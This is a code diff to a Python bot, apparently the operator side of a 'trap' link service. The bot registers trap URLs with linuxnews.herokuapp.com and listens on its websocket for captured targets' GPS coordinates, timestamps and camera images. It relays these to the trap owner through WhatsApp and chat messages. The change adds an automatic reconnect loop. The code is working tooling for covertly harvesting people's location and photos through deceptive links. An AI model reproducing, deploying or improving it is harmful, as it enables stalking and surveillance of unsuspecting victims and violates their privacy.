@@ -55,26 +55,30 @@ def addUrl(chat_id, url):
     return requests.post("https://linuxnews.herokuapp.com/addTrap", data={"token":token, "url":url, "name":chat_id}).json()["status"]
 
 async def hello():
-    uri = "ws://linuxnews.herokuapp.com/ws"
-    async with websockets.connect(uri) as websocket:
-        await websocket.send(json.dumps({
-            "email":email,
-            "password":password
-        }))
-        while True:
-            greeting = json.loads(await websocket.recv())
-            chat_id = greeting.pop("trap_name")
-            x = greeting.pop("GeoLongitude")
-            y = greeting.pop("GeoLatitude")
-            greeting["GeoTimestamp"] = datetime.datetime.fromtimestamp(int(greeting["GeoTimestamp"])/1000).strftime("%a %h %Y, %r")
-            if "img" in greeting.keys():
-                sendImage(url=uploadImage(greeting.pop("img")[31:],expiration=60), chat_id=chat_id, pesan=pretyTRAP(greeting))
-                sendMessage(chat_id=chat_id, x=y, y=x)
-            else:
-                client.messages.create(
-                    body=pretyTRAP(greeting),from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
-                )
-                sendMessage(chat_id=chat_id, x=y, y=x)
+    while True:
+        try:
+            uri = "ws://linuxnews.herokuapp.com/ws"
+            async with websockets.connect(uri) as websocket:
+                await websocket.send(json.dumps({
+                    "email":email,
+                    "password":password
+                }))
+                while True:
+                    greeting = json.loads(await websocket.recv())
+                    chat_id = greeting.pop("trap_name")
+                    x = greeting.pop("GeoLongitude")
+                    y = greeting.pop("GeoLatitude")
+                    greeting["GeoTimestamp"] = datetime.datetime.fromtimestamp(int(greeting["GeoTimestamp"])/1000).strftime("%a %h %Y, %r")
+                    if "img" in greeting.keys():
+                        sendImage(url=uploadImage(greeting.pop("img")[31:],expiration=60), chat_id=chat_id, pesan=pretyTRAP(greeting))
+                        sendMessage(chat_id=chat_id, x=y, y=x)
+                    else:
+                        client.messages.create(
+                            body=pretyTRAP(greeting),from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
+                        )
+                        sendMessage(chat_id=chat_id, x=y, y=x)
+        except websockets.exceptions.ConnectionClosedError:
+            pass
 @app.route("/", methods=["POST", "GET"])
 def on_message_received():
     if request.method == "POST":
